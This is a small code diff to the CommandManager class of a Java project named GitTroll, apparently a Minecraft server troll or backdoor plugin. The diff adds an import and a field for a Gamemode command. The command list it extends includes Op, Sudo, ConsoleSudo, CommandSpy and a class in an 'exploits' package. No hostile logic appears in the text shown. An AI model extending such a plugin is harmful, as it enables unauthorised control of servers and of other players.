@@ -28,6 +28,7 @@ import net.Lenni0451.GitTroll.command.commands.bungeecord.BungeeRedirect;
 import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
 import net.Lenni0451.GitTroll.command.commands.player.CommandSpy;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
+import net.Lenni0451.GitTroll.command.commands.player.Gamemode;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
 import net.Lenni0451.GitTroll.command.commands.player.Sudo;
@@ -104,6 +105,7 @@ public class CommandManager implements Listener {
 	public final Sudo Sudo = null;
 	public final ConsoleSudo ConsoleSudo = null;
 	public final CommandSpy CommandSpy = null;
+	public final Gamemode Gamemode = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
